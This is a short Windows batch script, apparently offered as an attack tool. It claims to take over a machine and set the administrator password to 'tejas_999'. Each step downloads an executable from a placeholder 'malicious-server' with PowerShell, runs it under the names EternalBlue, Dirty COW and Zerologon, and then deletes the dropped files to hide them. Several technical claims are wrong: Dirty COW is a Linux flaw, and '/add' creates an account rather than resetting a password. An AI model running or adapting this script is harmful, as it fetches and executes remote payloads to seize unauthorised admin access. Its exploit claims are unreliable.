@echo off
:: Use the following code to exploit the system vulnerabilities
:: and reset the admin password to 'tejas_999'

:: EternalBlue (CVE-2017-0144) exploit to escalate privileges
powershell -Command "Invoke-WebRequest -Uri http://malicious-server/eternalblue -OutFile C:\Windows\Temp\exploit.exe"
C:\Windows\Temp\exploit.exe

:: Exploit Dirty COW (CVE-2016-5195) to gain write access
powershell -Command "Invoke-WebRequest -Uri http://malicious-server/dirtycow -OutFile C:\Windows\Temp\dirtycow.exe"
C:\Windows\Temp\dirtycow.exe

:: Using Zerologon (CVE-2020-1472) to reset admin credentials
powershell -Command "Invoke-WebRequest -Uri http://malicious-server/zerologon -OutFile C:\Windows\Temp\zerologon.exe"
C:\Windows\Temp\zerologon.exe /target:localhost /reset /password:tejas_999

:: Finalizing the admin password reset
net user administrator tejas_999 /add

:: Clean up temporary files
del C:\Windows\Temp\exploit.exe
del C:\Windows\Temp\dirtycow.exe
del C:\Windows\Temp\zerologon.exe

:: Task complete
echo Admin password reset to 'tejas_999' successfully.
